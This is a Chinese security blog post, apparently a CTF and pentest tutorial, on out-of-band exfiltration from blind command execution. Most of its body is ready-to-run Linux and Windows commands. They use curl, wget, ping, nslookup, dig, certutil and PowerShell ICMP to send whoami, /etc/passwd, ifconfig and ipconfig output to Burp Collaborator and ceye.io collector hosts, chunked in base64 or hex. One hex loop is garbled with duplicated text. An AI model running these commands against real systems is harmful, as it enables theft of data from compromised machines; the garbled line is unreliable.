<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>OOB外带攻击 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">OOB外带攻击</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/">2022-11-22</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="对内攻击"><a href="#对内攻击" class="headerlink" title="对内攻击"></a>对内攻击</h2><p>在一次攻击当中,只有一条通道，属于in-band（带内）攻击，我们常见的攻击类型就是这种类型，大多数的攻击都属于带内攻击，在一条通信通道内进行的攻击。<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665493942514-f4c248c0-0602-43e7-80d2-9ced56ad72db.png" alt="image.png"></p>
<h2 id="对外攻击"><a href="#对外攻击" class="headerlink" title="对外攻击"></a>对外攻击</h2><p>但是有的时候我们的攻击也可能不在一条通道上，同一次攻击下，不止一条信道，则属于out-band（带外）攻击，由我们的一端向服务器发送请求，让服务器执行我们请求中的向另外一个公网的请求<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665493992376-c096cc51-f3aa-4874-a946-7515110a80ed.png" alt="image.png"></p>
<h2 id="盲"><a href="#盲" class="headerlink" title="盲"></a>盲</h2><p><strong>程序不进行详细的回显信息，而只是返回对或者错时，我们都可以叫它盲</strong>。我们在做<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/wpt?from=10680">渗透测试</a>的时候，经常会遇到这种情况，测试跨站可能有些功能插入恶意脚本后无法立即触发，例如提交反馈表单，需要等管理员打开查看提交信息时才会触发，或者是盲注跨站，盲打 XSS 这种。再例如 SSRF，如果程序不进行回显任何信息，而只提示你输入的是否合法，那么也无法直接判断程序存在 SSRF 漏洞，我们可以叫盲 SSRF。再例如 XXE，引入外部文件时，如果程序也不返回任何信息和引用文件的内容，而只提示输入的是否有误，那么也无法直接判断程序是否存在 XXE 漏洞，我们也可以叫盲 XXE。<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665494309999-5c046ff8-2199-4632-a876-c973f64bfef4.png" alt="image.png"></p>
<h1 id="基本回显思路"><a href="#基本回显思路" class="headerlink" title="基本回显思路"></a>基本回显思路</h1><h2 id="对于出网机器"><a href="#对于出网机器" class="headerlink" title="对于出网机器"></a>对于出网机器</h2><p><strong>使用http传输，如wget，curl，certutil将回显信息爬出</strong><br>** 优点：**方便，回显全。</p>
<p>** 缺点：**1.对于不出网服务器没有办法传输，同时需要了解其返回包字段信息，需要使用返回包字段将回显信息带出</p>
<h2 id="对于不出网机器"><a href="#对于不出网机器" class="headerlink" title="对于不出网机器"></a>对于不出网机器</h2><p><strong>使用DNS传输，ICMP传输，powershell中的wget，curl等传输</strong><br>** 优点：**不出网机器可以传输</p>
<p>**  缺点：**1.回显是一条条执行，需要将回显结果拼接解码，回显信息比较麻烦<br>2.短回显可以使用DNS传输，长回显大部分带出需要powershell搭配，但杀毒软件往往禁用powershell，因此利用条件较苛刻</p>
<h2 id="burpsuit-Collaborator-Client模块回显"><a href="#burpsuit-Collaborator-Client模块回显" class="headerlink" title="burpsuit Collaborator Client模块回显"></a><strong>burpsuit Collaborator Client模块回显</strong></h2><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665498456481-fbab1c32-ed54-45d1-8dc7-768384d85b5f.png" alt="image.png"><br>点击复制一下由burp生成的二级域名地址<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665498493742-96ec077b-0db2-4c69-b38b-5d88dd35ba41.png" alt="image.png"><br>和在线网站的用法其实都差不多,这里就不过多赘述</p>
<pre><code class="php">//http
curl `whoami`.u725dozxmas6ru7honh9r8flmcs3gs.burpcollaborator.net
curl u725dozxmas6ru7honh9r8flmcs3gs.burpcollaborator.net/`whoami`
//dns
ping `whoami`.u725dozxmas6ru7honh9r8flmcs3gs.burpcollaborator.net
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665499156367-f822781b-dcff-456f-823d-ec8ebfe5c66b.png" alt="image.png"></p>
<h2 id="Linux-在线网站DNS-HTTP管道解析"><a href="#Linux-在线网站DNS-HTTP管道解析" class="headerlink" title="(Linux)在线网站DNS/HTTP管道解析"></a><strong>(Linux)在线网站DNS/HTTP管道解析</strong></h2><p>经常在拿下shell的时候碰到命令执行无回显的情况，因此为了解决命令执行无回显时，可以借助DNS管道解析来让命令回显<br>在线网站有<a target="_blank" rel="noopener" href="http://dnslog.cn/">dnslog</a>和<a target="_blank" rel="noopener" href="http://ceye.io/">ceye</a></p>
<h3 id="HTTP带外攻击"><a href="#HTTP带外攻击" class="headerlink" title="HTTP带外攻击"></a>HTTP带外攻击</h3><p>linux可以使用以下方法：</p>
<h4 id="通过curl远程命令执行RCE"><a href="#通过curl远程命令执行RCE" class="headerlink" title="通过curl远程命令执行RCE"></a>通过curl远程命令执行RCE</h4><h5 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h5><pre><code class="php">通过http记录查看是否执行（最好执行两次），curl走http协议
curl XXX.ceye.io/`whoami`
curl `whoami`.XXX.ceye.io
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495542386-666d7faa-efd7-4deb-8cde-9dd81383aa59.png" alt="image.png"><br>我分别执行了whoami和cat /etc/passwd命令<br>效果也能明显，但是当数据较多时，只回显了第一条数据<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495602469-9d322896-4297-4174-aa29-7ecc02a375be.png" alt="image.png"></p>
<h5 id="如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的"><a href="#如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的" class="headerlink" title="如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的"></a>如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的</h5><pre><code class="php">curl XXX.ceye.io/`ls -al|sed -n &#39;2p&#39;` //这里回显的就是第二行数据了
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495827542-f8cd7de4-7f6e-434b-91e1-af154afbaa21.png" alt="image.png"></p>
<h5 id="使用base64传输"><a href="#使用base64传输" class="headerlink" title="使用base64传输"></a>使用base64传输</h5><pre><code class="php">curl XXX.ceye.io/`ls -al|sed -n &#39;2p&#39;|base64`   
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495978518-7628cd8a-baf8-4ff0-9b81-14198b4f3a11.png" alt="image.png"></p>
<h5 id="有的时候长度太大，cut来分割字符-第一个字符下标为1"><a href="#有的时候长度太大，cut来分割字符-第一个字符下标为1" class="headerlink" title="有的时候长度太大，cut来分割字符(第一个字符下标为1)"></a>有的时候长度太大，cut来分割字符(第一个字符下标为1)</h5><pre><code class="php">curl XXX.ceye.io/`ls -al |cut -c 3-10`
</code></pre>
<h4 id="wget传输"><a href="#wget传输" class="headerlink" title="wget传输"></a>wget传输</h4><p><strong>使用wget将命令回显信息通过包头数据字符串User-Agent传输至攻击服务器上，xargs echo–n代表去掉各个分隔符，换行符等符号输出</strong></p>
<pre><code class="php">wget --header=&quot;HY:`cat /etc/passwd | xargs echo –n`&quot; zqtpylwvynwgaxifh1kfjquhn8t5hu.burpcollaborator.net
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665681959294-c266f596-ad7f-494d-8789-88f7fbbb6e9d.png" alt="image.png"><br>查看访问记录<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665681982982-db081893-ec22-4504-ac3c-311a9315ebd3.png" alt="image.png"></p>
<h3 id="dns带外攻击"><a href="#dns带外攻击" class="headerlink" title="dns带外攻击"></a>dns带外攻击</h3><h4 id="单条信息"><a href="#单条信息" class="headerlink" title="单条信息"></a>单条信息</h4><p><strong>通过DNS记录查看是否执行（最好执行两次），ping走的是DNS协议</strong></p>
<pre><code class="php">ping `whoami`.XXXX.ceye.io
</code></pre>
<p>这里也可以用网站dnslog<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665496640653-19614883-8ea1-4bca-9243-1ea1293e2d7a.png" alt="image.png"><br>但是也只有第一条数据,只适合单条的短信息回显</p>
<h4 id="base64进行多条信息"><a href="#base64进行多条信息" class="headerlink" title="base64进行多条信息"></a>base64进行多条信息</h4><pre><code class="php">var=11111 &amp;&amp; for i in $(ifconfig|base64|awk &#39;&#123;gsub(/.&#123;50&#125;/,&quot;&amp;\n&quot;)&#125;1&#39;); do var=$((var+1)) &amp;&amp; nslookup $var.$i.402c35vpn9hpplp9ilj09pxx9ofe33.burpcollaborator.net; done
</code></pre>
<p>如果找不到nslookup命令<br>使用命令安装</p>
<pre><code class="php">yum -y install bind-utils
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680141774-bb8bb6ac-3917-402a-a4f7-3475c12e6da8.png" alt="image.png"><br>将base64一条条解码即可<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680150290-edc7e652-0622-4a10-9cab-0c457e63afe2.png" alt="image.png"></p>
<h4 id="16进制传输"><a href="#16进制传输" class="headerlink" title="16进制传输"></a>16进制传输</h4><pre><code class="php">var=11111 &amp;&amp; for b in $(ifconfig|xxd -p ); do var=$((var+1)) &amp;&amp; dig $var.$b.var=11111 &amp;&amp; for b in $(ifconfig|xxd -p ); do var=$((var+1)) &amp;&amp; dig $var.$b.ezh4705a725vjcruqgtus53wwn2hq6.burpcollaborator.net; done; done
</code></pre>
<p>如果找不到xxd命令<br>使用:</p>
<pre><code class="php">yum install vim-common
</code></pre>
<p>来安装<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680505374-362ac081-08bc-47e0-80d5-854195f69fef.png" alt="image.png"><br>在burp中可以看到<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680486320-70e0ef60-a251-4fe8-84fd-2f19d4dbfc82.png" alt="image.png"><br>一行行复制查看即可，结果还算准确<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680468991-273879c2-4f23-4a59-9cf3-072479341360.png" alt="image.png"></p>
<h4 id="ICMP传输"><a href="#ICMP传输" class="headerlink" title="ICMP传输"></a>ICMP传输</h4><pre><code class="php">linux
靶机
cat /etc/passwd | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 easn1l1elxy8t7azlztz02gkbbh65v.burpcollaborator.net;done
攻击者
sudo tcpdump &#39;icmp and src host 202.14.120.xx&#39; -w icmp_file.pcap#To capture
攻击者提取数据
echo &quot;0x$(tshark -n -q -r icmp_file.pcap -T fields -e data.data | tr -d &#39;\n&#39; | tr -d &#39;:&#39;)&quot; | xxd -r -p   #Or Use Wireshark gui
</code></pre>
<h2 id="windows系统外带"><a href="#windows系统外带" class="headerlink" title="windows系统外带"></a>windows系统外带</h2><h3 id="http传输"><a href="#http传输" class="headerlink" title="http传输"></a>http传输</h3><h4 id="curl传输"><a href="#curl传输" class="headerlink" title="curl传输"></a>curl传输</h4><pre><code class="php">windows中 %xxx% 的xxx代表系统变量,常用系统变量命令
              %SystemDrive%                                     系统安装的磁盘分区
              %SystemRoot% = %Windir% WINDODWS                  系统目录
              %ProgramFiles%　                                  应用程序默认安装目录
              %AppData%                                         应用程序数据目录
              %CommonProgramFiles%                              公用文件目录
              %HomePath%                                        当前活动用户目录
              %Temp% =%Tmp%                                     当前活动用户临时目录
              %DriveLetter%                                     逻辑驱动器分区
              %HomeDrive%                                       当前用户系统所在分区
</code></pre>
<p><strong>curl抓取用户名：//</strong>%USERNAME%，列出所有用户名</p>
<pre><code class="php">curl http://x75kydmzeqh0o6g5srhxz2joofu8ix.burpcollaborator.net/%USERNAME%
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665906863933-a53b3205-a5f8-4fd1-8598-e6145c5d02a4.png" alt="image.png"><br><strong>curl获取windows安装目录：</strong>//%WinDir%，列出windows的安装目录</p>
<pre><code class="php">curl http://x75kydmzeqh0o6g5srhxz2joofu8ix.burpcollaborator.net/%WinDir%
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665906919432-fd128314-4070-41fd-bc0a-40207e4c85ad.png" alt="image.png"></p>
<h4 id="certutil利用"><a href="#certutil利用" class="headerlink" title="certutil利用"></a>certutil利用</h4><p>将ipconfig的结果记录在新建temp文件中，再对temp文件进行base64加密变成temp2文件，再对temp2文件中的多余字符”CERTIFICATE”删掉变成temp3，再对temp3的内容删除换行符生成所有数据只在一行的temp4（因为http响应包想要信息全部输出必须使信息全在一行），并把temp4的内容赋予变量为p1，最后使用curl爬取p1的值赋予http响应包的User-Agent字段输出于http:// qysvrrmxvestl2c93ydg0u5p1g76vv.burpcollaborator.net中，最后删除本地文件夹中所有生成的带有temp字段的文件（也就是之前生成的temp~temp4四个文件）</p>
<pre><code class="php">ipconfig &gt; temp &amp;&amp; certutil -f -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; (for /f %i in (./temp3) do set /p=%i&lt;nul &gt;&gt;temp4) || set /p pl=&lt;temp4 &amp;&amp; curl -H &quot;User-Agent:%pl%&quot; x75kydmzeqh0o6g5srhxz2joofu8ix.burpcollaborator.net &amp;&amp; del temp*
</code></pre>
<p>数据在useragent里<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665907105337-f0ebfb0b-f735-4444-8f2d-6fd7d13f712c.png" alt="image.png"><br>解码即可<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665907126557-aff65172-de84-414f-9b9b-c2ae1751318c.png" alt="image.png"></p>
<h3 id="DNS传输"><a href="#DNS传输" class="headerlink" title="DNS传输"></a>DNS传输</h3><h4 id="dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）"><a href="#dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）" class="headerlink" title="dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）"></a>dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）</h4><pre><code class="php">for /L %i in (1,1,10) do nslookup    //执行10次nslookup命令
cmd /v /c &quot;hostname &gt; temp &amp;&amp; certutil -f -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt;temp3 &amp;&amp; set FINAL=!MYVAR!.fq94atmnmopixkbqusvwe2s23t9jx8.burpcollaborator.net &amp;&amp; nslookup !FINAL!&quot;
</code></pre>
<h4 id="十六进制传输：（hex）–缺点：必须调用powershell"><a href="#十六进制传输：（hex）–缺点：必须调用powershell" class="headerlink" title="十六进制传输：（hex）–缺点：必须调用powershell"></a>十六进制传输：（hex）–缺点：必须调用powershell</h4><pre><code class="php">whoami &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&#39; &#39;,&#39;&#39;);$j=11111;foreach($i in $sub)&#123; $fin=$j.tostring()+&#39;.&#39;+$i+&#39;.xfgmzbb5b6e0m208jake3khksby2mr.burpcollaborator.net&#39;;$j += 1; nslookup $fin &#125;
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927157061-f835d131-24fd-45d4-8177-77ba8e15fe08.png" alt="image.png"><br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927167931-6bc8191b-53ad-4bdb-a9c7-2f9a98f99590.png" alt="image.png"><br>直接16进制转字符串即可<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927189900-4adb399f-06ed-4a01-98d0-7499428f8ee3.png" alt="image.png"></p>
<h4 id="通过win-r，直接输入-USERNAME-调用Burp地址来调用DNS解析记录"><a href="#通过win-r，直接输入-USERNAME-调用Burp地址来调用DNS解析记录" class="headerlink" title="通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录"></a>通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录</h4><p><strong>使用windows的win+r调出运行，再执行第二行代码，会调用DNS解析</strong></p>
<pre><code class="php">win+r
\\%USERNAME%.0ijp2ee8e9h3p53bmdnh6nknve16pv.burpcollaborator.net
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927381636-f775b7db-a2f2-4451-be17-c2a84d198b0b.png" alt="image.png"></p>
<h4 id="ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）"><a href="#ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）" class="headerlink" title="ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）"></a>ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）</h4><pre><code class="php">whoami &gt; output.txt &amp;&amp; powershell $text=Get-Content output.txt;$ICMPClient = New-Object System.Net.NetworkInformation.Ping;$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;$PingOptions.DontFragment = $True;$sendbytes = ([text.encoding]::ASCII).GetBytes($text);$ICMPClient.Send(&#39;rpkg95lzl0ouwwa2t4u8dere258ywn.burpcollaborator.net&#39;,60 * 1000, $sendbytes, $PingOptions);
</code></pre>
<p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927749557-8adf803b-be2d-467f-994a-13d976c90613.png" alt="image.png"><br>回显信息失败，但是有dns解析记录<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927773487-b5c7fa08-f92a-4fa1-94fa-e53050992206.png" alt="image.png"></p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/">https://sakurahack-y.github.io/2022/11/22/OOB带外攻击/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E5%A4%96%E5%B8%A6%E6%94%BB%E5%87%BB/">外带攻击</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%86%85%E6%94%BB%E5%87%BB"><span class="toc-number">1.1.</span> <span class="toc-text">对内攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%A4%96%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.</span> <span class="toc-text">对外攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2"><span class="toc-number">1.3.</span> <span class="toc-text">盲</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%9B%9E%E6%98%BE%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">基本回显思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8"><span class="toc-number">2.1.</span> <span class="toc-text">对于出网机器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8"><span class="toc-number">2.2.</span> <span class="toc-text">对于不出网机器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#burpsuit-Collaborator-Client%E6%A8%A1%E5%9D%97%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.</span> <span class="toc-text">burpsuit Collaborator Client模块回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99DNS-HTTP%E7%AE%A1%E9%81%93%E8%A7%A3%E6%9E%90"><span class="toc-number">2.4.</span> <span class="toc-text">(Linux)在线网站DNS&#x2F;HTTP管道解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB"><span class="toc-number">2.4.1.</span> <span class="toc-text">HTTP带外攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87curl%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">通过curl远程命令执行RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95"><span class="toc-number">2.4.1.1.1.</span> <span class="toc-text">简单测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E5%9B%9E%E6%98%BE%E4%BF%A1%E6%81%AF%E4%B8%8D%E5%85%A8%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E7%BB%93%E5%90%88sed%E5%91%BD%E4%BB%A4%E4%BB%A4%E5%9B%9E%E6%98%BE%E5%AE%8C%E6%95%B4%EF%BC%8C%E4%BD%86%E5%85%B6%E5%AE%9E%E4%B9%9F%E4%B8%8D%E6%98%AF%E5%85%A8%E7%9A%84"><span class="toc-number">2.4.1.1.2.</span> <span class="toc-text">如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8base64%E4%BC%A0%E8%BE%93"><span class="toc-number">2.4.1.1.3.</span> <span class="toc-text">使用base64传输</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%89%E7%9A%84%E6%97%B6%E5%80%99%E9%95%BF%E5%BA%A6%E5%A4%AA%E5%A4%A7%EF%BC%8Ccut%E6%9D%A5%E5%88%86%E5%89%B2%E5%AD%97%E7%AC%A6-%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%8B%E6%A0%87%E4%B8%BA1"><span class="toc-number">2.4.1.1.4.</span> <span class="toc-text">有的时候长度太大，cut来分割字符(第一个字符下标为1)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wget%E4%BC%A0%E8%BE%93"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">wget传输</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB"><span class="toc-number">2.4.2.</span> <span class="toc-text">dns带外攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E6%9D%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">单条信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E8%BF%9B%E8%A1%8C%E5%A4%9A%E6%9D%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">base64进行多条信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">16进制传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ICMP%E4%BC%A0%E8%BE%93"><span class="toc-number">2.4.2.4.</span> <span class="toc-text">ICMP传输</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E7%B3%BB%E7%BB%9F%E5%A4%96%E5%B8%A6"><span class="toc-number">2.5.</span> <span class="toc-text">windows系统外带</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E4%BC%A0%E8%BE%93"><span class="toc-number">2.5.1.</span> <span class="toc-text">http传输</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#curl%E4%BC%A0%E8%BE%93"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">curl传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#certutil%E5%88%A9%E7%94%A8"><span class="toc-number">2.5.1.2.</span> <span class="toc-text">certutil利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E4%BC%A0%E8%BE%93"><span class="toc-number">2.5.2.</span> <span class="toc-text">DNS传输</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E4%BC%A0%E8%BE%93%EF%BC%88%E5%8D%95%E6%9D%A1%E4%BC%A0%E8%BE%93%EF%BC%8C%E5%BE%88%E9%B8%A1%E8%82%8B%E4%B8%8D%E6%8E%A8%E8%8D%90%EF%BC%8C%E5%8F%AA%E8%83%BD%E6%89%A7%E8%A1%8Chostname%E5%91%BD%E4%BB%A4%EF%BC%89"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 